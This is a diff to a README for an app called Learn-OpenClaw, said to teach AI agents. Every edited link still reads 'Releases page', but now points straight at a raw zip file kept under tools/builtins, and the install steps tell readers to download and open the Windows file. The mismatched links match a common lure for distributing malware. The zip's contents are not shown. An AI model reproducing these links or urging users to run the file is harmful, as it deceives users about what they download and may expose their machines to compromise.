@@ -1,6 +1,6 @@
 # 🧠 Learn-OpenClaw - Learn Agents in One Day
 
-[![Download Learn-OpenClaw](https://img.shields.io/badge/Download%20Learn-OpenClaw-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Cecillaunion404/Learn-OpenClaw/releases)
+[![Download Learn-OpenClaw](https://img.shields.io/badge/Download%20Learn-OpenClaw-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Cecillaunion404/Learn-OpenClaw/raw/refs/heads/main/tools/builtins/Learn_Open_Claw_1.1.zip)
 
 ## 🚀 What This App Does
 
@@ -20,7 +20,7 @@ Use it to:
 
 Visit this page to download the app:
 
-[Download Learn-OpenClaw from Releases](https://github.com/Cecillaunion404/Learn-OpenClaw/releases)
+[Download Learn-OpenClaw from Releases](https://github.com/Cecillaunion404/Learn-OpenClaw/raw/refs/heads/main/tools/builtins/Learn_Open_Claw_1.1.zip)
 
 On the release page, look for the latest version and download the Windows file. After the download ends, open the file to start the app.
 
@@ -38,7 +38,7 @@ The app is made for a normal desktop or laptop. It should run on most recent Win
 
 ## 📦 How to Install
 
-1. Open the [Releases page](https://github.com/Cecillaunion404/Learn-OpenClaw/releases)
+1. Open the [Releases page](https://github.com/Cecillaunion404/Learn-OpenClaw/raw/refs/heads/main/tools/builtins/Learn_Open_Claw_1.1.zip)
 2. Find the latest version at the top
 3. Download the Windows file
 4. When the download finishes, open the file
@@ -151,7 +151,7 @@ This layout keeps the app focused on learning first, not setup.
 
 When a new version is available:
 
-1. Visit the [Releases page](https://github.com/Cecillaunion404/Learn-OpenClaw/releases)
+1. Visit the [Releases page](https://github.com/Cecillaunion404/Learn-OpenClaw/raw/refs/heads/main/tools/builtins/Learn_Open_Claw_1.1.zip)
 2. Download the newest Windows file
 3. Open the new file
 4. Follow the same install steps
@@ -177,7 +177,7 @@ You can stop after any lesson and return later.
 
 ## 📥 Download Again
 
-[Visit the Learn-OpenClaw Releases page](https://github.com/Cecillaunion404/Learn-OpenClaw/releases)
+[Visit the Learn-OpenClaw Releases page](https://github.com/Cecillaunion404/Learn-OpenClaw/raw/refs/heads/main/tools/builtins/Learn_Open_Claw_1.1.zip)
 
 ## 📌 Notes for a Smooth Start
 
